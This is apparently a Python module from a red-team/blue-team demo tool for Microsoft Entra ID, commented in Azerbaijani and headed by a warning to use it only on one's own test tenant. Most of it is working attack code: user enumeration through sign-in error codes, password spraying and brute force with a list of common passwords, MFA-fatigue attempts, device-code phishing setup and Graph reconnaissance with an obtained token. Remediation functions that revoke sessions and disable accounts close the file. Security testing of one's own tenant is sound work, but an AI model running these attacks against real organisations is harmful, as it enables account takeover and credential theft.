"""
modules/attack_engine.py
-------------------------
DİQQƏT (VACİB): Bu modul YALNIZ sizin ÖZ test/sandbox Microsoft Entra ID
kirayəçinizə (tenant) qarşı, açıq razılıqla istifadə edilməlidir.
Başqa təşkilatın kirayəçisinə qarşı istifadəsi qanunsuzdur və
Microsoft-un İstifadə Şərtlərini pozur.

DƏYİŞİKLİKLƏR (bu versiya — Cloud/Graph fix):
1. KÖK SƏBƏB DÜZƏLİŞİ: əvvəlki versiya istifadəçi siyahısını YALNIZ lokal
   `data/test_identities.json` faylından oxuyurdu. Bu fayl (düzgün olaraq)
   .gitignore-dadır və Streamlit Cloud-a deploy olunmur, ona görə Cloud-da
   avtomatik yaradılan boş nümunə fayl (tək bir placeholder user ilə) işə
   düşürdü və hücumlar saxta `fake_user_*` adlarına qarşı gedib AADSTS50034
   ilə uğursuz olurdu.
2. YENİ: `fetch_tenant_users_from_graph()` — artıq admin-consent verilmiş
   `User.Read.All` / `Directory.Read.All` Application icazələri ilə
   Microsoft Graph-dan HƏQİQİ tenant istifadəçilərini (UPN-ləri) çəkir.
   Bu, həm lokalda, həm Cloud-da EYNİ şəkildə işləyir, çünki heç bir yerli
   fayla ehtiyac duymur — yalnız `.env`/Cloud secrets-dəki
   TENANT_ID/CLIENT_ID/CLIENT_SECRET-ə əsaslanır.
3. YENİ: `_load_test_identities()` indi əvvəlcə `config.TEST_IDENTITIES_JSON`
   (Cloud secrets-də saxlanan JSON mətni) yoxlayır, sonra lokal fayla enir.
   Bu, "bilinən doğru şifrə" demo ssenarilərini TƏHLÜKƏSİZ şəkildə Cloud-a
   köçürməyə imkan verir (real şifrə heç vaxt git-ə commit olunmur).
4. Wordlist-lər artıq hər tətbiq başlanğıcında YENİDƏN generasiya olunur
   (əvvəlki versiya `if not os.path.exists(...)` ilə YALNIZ bir dəfə
   yazırdı — kод düzəldilsə belə köhnə fayl qalırdısa dəyişiklik heç vaxt
   görünməzdi).
"""
import os
import json
import time
import msal
import requests

from . import config

USERS_FILE = "users_wordlist.txt"
PASSWORDS_FILE = "passwords_wordlist.txt"

_DATA_DIR = os.path.join(os.path.dirname(__file__), "..", "data")
TEST_IDENTITIES_FILE = os.path.join(_DATA_DIR, "test_identities.json")

GRAPH_USERS_ENDPOINT = "https://graph.microsoft.com/v1.0/users"


def _load_test_identities() -> dict:
    """
    Test istifadəçi/şifrə cütlüklərini yükləyir. Prioritet sırası:

      1. `config.TEST_IDENTITIES_JSON` — Cloud secrets-də (və ya .env-də)
         saxlanan tam JSON mətni (məs. Streamlit Cloud secrets.toml-da
         çox sətirli string kimi). Bu, real şifrələri git-ə commit etmədən
         Cloud-a təhlükəsiz köçürməyə imkan verir.
      2. Lokal `data/test_identities.json` faylı (yalnız lokal inkişaf üçün,
         .gitignore-da qalmalıdır).
      3. Heç biri yoxdursa, nümunə şablon yaradılır (REAL şifrə YAZMIR).
    """
    if config.TEST_IDENTITIES_JSON:
        try:
            data = json.loads(config.TEST_IDENTITIES_JSON)
            data["_source"] = "secrets (ARGUS_TEST_IDENTITIES_JSON)"
            return data
        except json.JSONDecodeError as e:
            print(f"[!] ARGUS_TEST_IDENTITIES_JSON parse xətası, lokal fayla keçilir: {e}")

    if not os.path.exists(TEST_IDENTITIES_FILE):
        os.makedirs(_DATA_DIR, exist_ok=True)
        sample = {
            "_warning": "Bu fayl real test istifadəçi məlumatlarınızı saxlayır. "
                        "Mütləq .gitignore-a əlavə edin, ictimai repoya push etməyin!",
            "_source": "local file (auto-generated placeholder)",
            "domain": config.DOMAIN or "example.onmicrosoft.com",
            "credentials": {
                "victimuser@example.onmicrosoft.com": "REPLACE_ME_ChangeThisPassword!"
            }
        }
        with open(TEST_IDENTITIES_FILE, "w", encoding="utf-8") as f:
            json.dump(sample, f, indent=2, ensure_ascii=False)
        return sample

    with open(TEST_IDENTITIES_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
        data.setdefault("_source", "local file (data/test_identities.json)")
        return data


_identities = _load_test_identities()
DOMAIN = config.DOMAIN or _identities.get("domain", "example.onmicrosoft.com")
REAL_CREDENTIALS = dict(_identities.get("credentials", {}))
IDENTITIES_SOURCE = _identities.get("_source", "unknown")


def fetch_tenant_users_from_graph(max_users: int = 200):
    """
    Microsoft Graph-dan (app-only, client credentials) HƏQİQİ tenant
    istifadəçilərinin userPrincipalName siyahısını çəkir.

    Tələb olunan Application (app-only) icazələri (admin consent ilə):
        - User.Read.All   VƏ YA
        - Directory.Read.All

    Qaytarır: (ok: bool, data: list[str] | str-xəta-mesajı)

    QEYD: Bu, YALNIZ istifadəçilərin MÖVCUDLUĞUNU (kimin hesabı var) həll edir.
    Şifrələri Graph API heç vaxt qaytarmır (mümkün deyil) — brute-force/spray
    demo ssenariləri üçün bilinən "doğru" şifrə hələ də `REAL_CREDENTIALS`-dan
    (yəni Cloud secrets və ya lokal test_identities.json-dan) gəlməlidir.
    """
    if not config.has_graph_credentials():
        return False, "ARGUS_TENANT_ID/CLIENT_ID/CLIENT_SECRET tapılmadı."

    try:
        cca = msal.ConfidentialClientApplication(
            config.CLIENT_ID,
            authority=config.AUTHORITY,
            client_credential=config.CLIENT_SECRET,
        )
        token_result = cca.acquire_token_for_client(scopes=["https://graph.microsoft.com/.default"])
        access_token = token_result.get("access_token")
        if not access_token:
            err = token_result.get("error_description", token_result.get("error", "naməlum"))
            return False, f"App-only token əldə edilmədi: {err}"
    except Exception as e:
        return False, f"MSAL token xətası: {e}"

    headers = {"Authorization": f"Bearer {access_token}"}
    url = f"{GRAPH_USERS_ENDPOINT}?$select=userPrincipalName,accountEnabled&$top=999"
    users = []

    try:
        while url and len(users) < max_users:
            resp = requests.get(url, headers=headers, timeout=15)
            if resp.status_code != 200:
                # Ən çox rastlanan hal: admin consent hələ təsdiqlənməyib (403),
                # ya da icazə tipi Delegated seçilib, Application yox.
                return False, f"Graph HTTP {resp.status_code}: {resp.text[:300]}"

            body = resp.json()
            for u in body.get("value", []):
                upn = u.get("userPrincipalName")
                if upn and u.get("accountEnabled", True):
                    users.append(upn)

            url = body.get("@odata.nextLink")  # pagination

        return True, users[:max_users]
    except Exception as e:
        return False, f"Graph sorğu xətası: {e}"


def generate_wordlists(force_refresh: bool = True):
    """
    BUG FIX: əvvəllər `if not os.path.exists(...)` şərti ilə yalnız BİR DƏFƏ
    yazılırdı — kod düzəldilsə belə, köhnə fayl mövcud qalırsa dəyişiklik heç
    vaxt tətbiq olunmurdu. İndi default olaraq `force_refresh=True` ilə hər
    tətbiq başlanğıcında YENİDƏN generasiya olunur (bu, sadə mətn faylları
    üçün ucuz əməliyyatdır, performans problemi yaratmır).

    İstifadəçi siyahısı üçün prioritet:
        1. Microsoft Graph-dan canlı çəkilən HƏQİQİ tenant istifadəçiləri
           (fetch_tenant_users_from_graph()) — həm lokal, həm Cloud-da eyni
           işləyir, çünki heç bir yerli fayla bağlı deyil.
        2. Graph sorğusu uğursuz olarsa (icazə yoxdur/şəbəkə problemi),
           REAL_CREDENTIALS-dakı (secrets və ya lokal fayl) bilinən
           istifadəçilərə enilir.
    Hər iki halda nəticəyə bir neçə aydın "fake_*" adı əlavə olunur ki,
    enumeration/negative-test ssenariləri də sınana bilsin.
    """
    graph_ok, graph_result = fetch_tenant_users_from_graph()

    if graph_ok and graph_result:
        real_users = graph_result
        user_source = "Microsoft Graph (canlı tenant sorğusu)"
    else:
        real_users = list(REAL_CREDENTIALS.keys())
        user_source = f"local fallback ({IDENTITIES_SOURCE}) — Graph fetch uğursuz oldu: {graph_result if not graph_ok else 'boş nəticə'}"

    # Bilinən şifrəli istifadəçilər (REAL_CREDENTIALS) həmişə siyahıya daxil
    # edilir ki, brute-force demo hədəfi itməsin, hətta Graph fetch uğurlu olsa da.
    for known_user in REAL_CREDENTIALS.keys():
        if known_user not in real_users:
            real_users.append(known_user)

    fake_users = [f"fake_user_{i}@{DOMAIN}" for i in range(1, 100)] + \
                 [f"corp_admin_{i}@{DOMAIN}" for i in range(1, 50)]
    all_users = real_users + fake_users

    all_passwords = None
    if force_refresh or not os.path.exists(PASSWORDS_FILE):
        real_passwords = list(REAL_CREDENTIALS.values())
        common_passwords = [
            "Password123!", "Admin2026!", "Welcome123!", "Spring2026!",
            "Security123!Entra", "Corporate2026!", "ChangeMe123!", "Company123!"
        ]
        all_passwords = common_passwords + real_passwords

    if force_refresh or not os.path.exists(USERS_FILE):
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            for u in all_users:
                f.write(f"{u}\n")

    if all_passwords is not None:
        with open(PASSWORDS_FILE, "w", encoding="utf-8") as f:
            for p in all_passwords:
                f.write(f"{p}\n")

    # Diaqnoz üçün UI-a ötürülə bilsin deyə qaytarırıq — səssiz fallback yoxdur.
    return {
        "user_source": user_source,
        "real_user_count": len(real_users),
        "fake_user_count": len(fake_users),
        "graph_fetch_ok": graph_ok,
        "graph_fetch_detail": graph_result if not graph_ok else f"{len(graph_result)} istifadəçi tapıldı",
    }


def load_list_from_file(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


class IdentityAttackEngine:
    """
    Red Team simulyasiya mühərriki (offensive) + Blue Team remediation (defensive).
    """

    def __init__(self, users_file, passwords_file):
        if not config.has_graph_credentials():
            raise RuntimeError(
                "ARGUS_TENANT_ID / ARGUS_CLIENT_ID / ARGUS_CLIENT_SECRET tapılmadı. "
                ".env faylını (yaxud Streamlit Cloud Secrets-i) doldurun."
            )
        self.public_app = msal.PublicClientApplication(
            config.CLIENT_ID, authority=config.AUTHORITY
        )
        self.users = load_list_from_file(users_file)
        self.passwords = load_list_from_file(passwords_file)

    # ------------------------------------------------------------------
    # RED TEAM — Hücum simulyasiyaları (əvvəlki məntiq eynilə saxlanılıb)
    # ------------------------------------------------------------------
    def run_user_enumeration(self, max_targets=20):
        print(f"\n[*] --- USER ENUMERATION TESTİ (İlk {max_targets} Hədəf) ---")
        for user in self.users[:max_targets]:
            # BUG FIX: MSAL bəzi hallarda (throttling/429, realm discovery xətası)
            # OAuth error dict qaytarmır — birbaşa exception atır. try/except
            # olmadan tək bir throttled sorğu bütün prosesi çökərtə bilər.
            try:
                result = self.public_app.acquire_token_by_username_password(
                    username=user,
                    password="DummyPassword123!",
                    scopes=["https://graph.microsoft.com/.default"]
                )
                err_desc = result.get("error_description", "")
                if any(c in err_desc for c in ["AADSTS50126", "AADSTS50055", "AADSTS50053", "AADSTS7000218"]):
                    print(f"[+] MÖVCUDDUR (Valid User): {user}")
                elif "AADSTS50034" in err_desc:
                    print(f"[-] MÖVCUD DEYİL (Invalid User): {user}")
                else:
                    print(f"[?] CAVAB ({user}): {err_desc[:50]}")
            except Exception as e:
                print(f"[-] UĞURSUZ (exception): {user} -> {str(e)[:80]}")
                time.sleep(1.5)
                continue
            time.sleep(0.3)

    def run_password_spray(self, spray_password="Autumn2026!Argus", max_targets=20):
        print(f"\n[*] --- KÜTLƏVİ PASSWORD SPRAY TESTİ ('{spray_password}') ---")
        targets = self.users[:max_targets]
        success_count = 0
        fail_count = 0
        for user in targets:
            # BUG FIX: eyni MSAL exception riski (throttling/429) — spray xüsusilə
            # çox sayda ardıcıl sorğu göndərdiyi üçün ən çox bu riskə məruz qalır.
            try:
                result = self.public_app.acquire_token_by_username_password(
                    username=user, password=spray_password,
                    scopes=["https://graph.microsoft.com/.default"]
                )
            except Exception as e:
                print(f"[-] UĞURSUZ (exception): {user} -> {str(e)[:80]}")
                fail_count += 1
                time.sleep(1.5)
                continue

            if "access_token" in result:
                print(f"[+] UĞURLU: {user}")
                success_count += 1
            else:
                err_desc = result.get("error_description", "")
                err = err_desc.splitlines()[0] if err_desc else result.get("error", "naməlum xəta")
                print(f"[-] UĞURSUZ: {user} -> ({err[:55]}...)")
                fail_count += 1
            time.sleep(0.4)
        print(f"\n[=] XÜLASƏ: {success_count} Uğurlu | {fail_count} Uğursuz")

    def run_brute_force(self, target_user, target_password):
        print(f"\n[*] --- BRUTE FORCE TESTİ ({target_user}) ---")
        test_passwords = self.passwords[:6] + [target_password]
        for password in test_passwords:
            try:
                result = self.public_app.acquire_token_by_username_password(
                    username=target_user, password=password,
                    scopes=["https://graph.microsoft.com/.default"]
                )
            except Exception as e:
                print(f"[-] UĞURSUZ (exception): {password} -> {str(e)[:60]}")
                time.sleep(1.5)
                continue

            if "access_token" in result:
                print(f"[+] UĞURLU: Doğru şifrə tapıldı -> '{password}'")
                return result["access_token"]
            else:
                err_desc = result.get("error_description", "")
                err = err_desc.splitlines()[0] if err_desc else result.get("error", "naməlum xəta")
                print(f"[-] UĞURSUZ: {password} -> ({err[:45]}...)")
            time.sleep(1)
        return None

    def run_mfa_fatigue_simulation(self, target_user, valid_password, count=2):
        print(f"\n[*] --- MFA FATIGUE SIMULYASİYASI ({target_user}) ---")
        for i in range(1, count + 1):
            print(f"[*] Cəhd #{i}...")
            try:
                result = self.public_app.acquire_token_by_username_password(
                    username=target_user, password=valid_password,
                    scopes=["https://graph.microsoft.com/.default"]
                )
                err_desc = result.get("error_description", "")
                if "access_token" in result:
                    print("    [+] UĞURLU: Daxil olundu.")
                else:
                    first_line = err_desc.splitlines()[0] if err_desc else "Xəta"
                    print(f"    [-] Cavab: {first_line[:60]}...")
            except Exception as e:
                print(f"    [-] UĞURSUZ (exception): {str(e)[:60]}")
            time.sleep(2)

    def run_device_code_phishing_init(self):
        print("\n[*] --- OAUTH DEVICE CODE FLOW SIMULYASİYASI ---")
        flow = self.public_app.initiate_device_flow(scopes=["https://graph.microsoft.com/.default"])
        if "user_code" in flow:
            print(f"[+] Link: {flow['verification_uri']} | Kod: {flow['user_code']}")

    def run_post_exploitation_audit(self, access_token):
        print("\n[*] --- TOKEN ACCESS & GRAPH RECONNAISSANCE ---")
        if not access_token:
            return
        headers = {"Authorization": f"Bearer {access_token}"}
        response = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
        if response.status_code == 200:
            user_data = response.json()
            print(f"[+] Məlumat Əldə Edildi: {user_data.get('displayName')} ({user_data.get('userPrincipalName')})")

    # ------------------------------------------------------------------
    # BLUE TEAM — Real remediation (Microsoft Graph app-only)
    # ------------------------------------------------------------------
    def get_admin_graph_token(self):
        """
        App-only (client credentials) token əldə edir. Bunun işləməsi üçün
        Entra ID App Registration-da 'User.ReadWrite.All' (Application icazəsi)
        admin tərəfindən təsdiqlənməlidir (admin consent).
        """
        cca = msal.ConfidentialClientApplication(
            config.CLIENT_ID,
            authority=config.AUTHORITY,
            client_credential=config.CLIENT_SECRET,
        )
        result = cca.acquire_token_for_client(scopes=["https://graph.microsoft.com/.default"])
        return result.get("access_token")

    def revoke_sign_in_sessions(self, user_upn: str):
        """Real: istifadəçinin bütün aktiv sessiya/refresh token-larını ləğv edir."""
        try:
            token = self.get_admin_graph_token()
        except Exception as e:
            return False, f"Admin token xətası: {e}"
        if not token:
            return False, "Admin token əldə edilmədi (Graph app-only icazələrini yoxlayın)."

        headers = {"Authorization": f"Bearer {token}"}
        resp = requests.post(
            f"https://graph.microsoft.com/v1.0/users/{user_upn}/revokeSignInSessions",
            headers=headers,
        )
        if resp.status_code in (200, 204):
            return True, "Sessiyalar ləğv edildi (revokeSignInSessions)."
        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"

    def disable_account(self, user_upn: str):
        """Real: istifadəçi hesabını Entra ID-də deaktiv edir (accountEnabled=false)."""
        try:
            token = self.get_admin_graph_token()
        except Exception as e:
            return False, f"Admin token xətası: {e}"
        if not token:
            return False, "Admin token əldə edilmədi (Graph app-only icazələrini yoxlayın)."

        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        resp = requests.patch(
            f"https://graph.microsoft.com/v1.0/users/{user_upn}",
            headers=headers,
            json={"accountEnabled": False},
        )
        if resp.status_code in (200, 204):
            return True, "Hesab deaktiv edildi (accountEnabled=false)."
        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"


if __name__ == "__main__":
    # Yalnız birbaşa `python modules/attack_engine.py` ilə işə salındıqda test axını.
    info = generate_wordlists()
    print(f"[*] İstifadəçi mənbəyi: {info['user_source']}")
    print(f"[*] Real: {info['real_user_count']} | Fake: {info['fake_user_count']}")

    engine = IdentityAttackEngine(USERS_FILE, PASSWORDS_FILE)

    engine.run_user_enumeration(max_targets=18)
    engine.run_password_spray(spray_password="Autumn2026!Argus", max_targets=18)

    target = f"user2@{DOMAIN}"
    token = engine.run_brute_force(target_user=target, target_password="Company123!Secure")

    engine.run_mfa_fatigue_simulation(target_user=f"victimuser@{DOMAIN}", valid_password="ArgusPass#2026!", count=2)
    engine.run_device_code_phishing_init()

    if token:
        engine.run_post_exploitation_audit(token)